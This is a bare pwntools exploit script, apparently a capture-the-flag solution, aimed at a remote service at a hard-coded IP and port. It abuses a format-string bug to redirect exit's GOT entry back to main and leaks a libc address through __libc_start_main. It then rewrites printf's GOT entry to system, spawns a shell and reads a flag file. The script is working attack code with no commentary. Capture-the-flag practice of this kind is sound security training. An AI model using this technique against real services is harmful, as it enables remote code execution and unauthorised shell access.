#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
l = ELF( './libc-2.27.so' )
host , port = '60.251.236.18' , 10003
y = remote( host , port )

main = 0x4011b3
exit_got = 0x404030
printf_got = 0x404018

p = flat(
    ( '%{}c%12$hhn%{}c%13$hn'.format( 0x40 , 0x11b3 - 0x40 ) ).ljust( 0x30 , '\0' ), # 6
    exit_got + 2,
    exit_got
)
y.sendline( p )

p = flat(
    'AB%8$s'.ljust( 0x10 , '\0' ), # 6
    0x403ff0,
)
y.sendline( p )
y.recvuntil( 'AB' )
l.address = u64( y.recv(6) + '\0\0' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

a = l.sym.system & 0xffff
b = (l.sym.system >> 16) & 0xffff

if b > a:
    s = ('%{}c%12$hn%{}c%13$hn'.format( a , b - a )).ljust( 0x30 , '\0' )
else:
    s = ('%{}c%13$hn%{}c%12$hn'.format( b , a - b )).ljust( 0x30 , '\0' )

p = flat(
    s,
    printf_got,
    printf_got + 2
)
y.sendline( p )

y.sendline( 'sh' )
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()